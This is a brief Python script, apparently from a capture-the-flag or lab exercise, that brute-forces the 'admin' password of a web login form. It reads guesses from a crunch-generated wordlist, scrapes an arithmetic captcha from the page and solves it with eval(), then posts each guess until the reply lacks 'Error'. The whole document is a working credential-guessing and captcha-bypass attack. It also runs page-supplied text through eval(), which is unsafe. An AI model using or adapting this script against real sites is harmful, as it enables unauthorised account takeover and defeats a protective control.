import re
import requests
session = requests.Session()

#tag where the capcha is getting generated 
regex = '<h5 style="text-align: center;margin-top: 4px">(.*?) = </h5>'

#password file is generated through crunch
with open('passwords.txt', 'r') as f:
    for password in f:
        password = password.rstrip()
        response = session.get('http://<app-ip-address>')
        output = re.search(regex, response.text)
        cookies = session.cookies.get_dict()
        captcha = eval(output.group(1))
        print("Trying Password: "+password)
        data = {"username": "admin", "password": password, "captcha": captcha}
        output = session.post('http://<app-ip-address>/login', cookies=cookies, data=data)
        if("Error" not in output.text):
            print("Password Found: "+password)
            break
